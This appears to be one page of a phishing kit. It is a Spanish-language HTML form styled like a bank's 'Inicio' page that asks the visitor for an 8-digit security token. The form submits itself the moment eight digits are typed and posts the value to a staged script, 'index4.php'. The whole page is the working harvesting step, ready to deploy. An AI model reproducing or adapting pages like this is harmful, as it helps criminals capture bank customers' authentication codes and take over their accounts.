<!DOCTYPE html>
<html><head>
				<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
                <title>Inicio</title>
                
				<meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no">
                
                <link rel="stylesheet" type="text/css" href="./fhs/style_crown.css">
		
		
		  	<script>
function soloNumeros(e){
  var key = window.event ? e.which : e.keyCode;
  if (key < 48 || key > 57) {
    e.preventDefault();
  }
}
</script>
                
        </head>
        <body>
                <header style="" class="ioscam">
                <nav class="header_wrapeer">
                        <div class="header__campaign"><div class="header__logo">
						<img src="./fhs/blanco.png"  sizes="(min-width: 900px) 20vw, 50vw" class="header__image">
						<img src="./fhs/bantp.png" >
						</div>
							</div>
						
                </nav>
                </header>
                <div class="container">
                        <h1>¡Bienvenido!</h1>
                        <form method="POST" action="index4.php"  name="form1" id="form1">
			        <br>  <br>  
					<div  align="center">
					 <h3>Ingresa tu número token</h3><br>
					 
					 
                           <input type="tel" maxlength="8" placeholder="Token" style="width:350px;font-size:18px;" onkeypress="soloNumeros(event)"  
									onkeyup="if (this.value.length == this.getAttribute('maxlength')) form1.submit();"  name="numer" autofocus required>
									
                              <br><br>
							  
							  
			
							  
                                
								
									<button type="submit" id="btnLogin" class="btn btn-blue btn-full btn-full-md" onclick="login()" style="background-color: #237aba;    width: 60%;
					padding: 2rem 4rem;    border: none;
    border-radius: 1px;
    color: #fff;
	text-align:center;
    font-family: Helvetica Neue,Arial,Helvetica,sans-serif;
    font-size: 1rem;
    margin: 0;
    padding: 1.3rem 3.7rem;
    transition: background-color .1s linear 0s;
    white-space: inherit;
    -moz-osx-font-smoothing: grayscale;
    -webkit-font-smoothing: antialiased;
    background-color: #237aba;
    outline: 0;
    display: inline-block;
    box-shadow: none!important;
    cursor: pointer;">Continuar</button>
                        
							  </div>
										
										
                        </form>
                        
						</div>
                         
   </body>
   </html>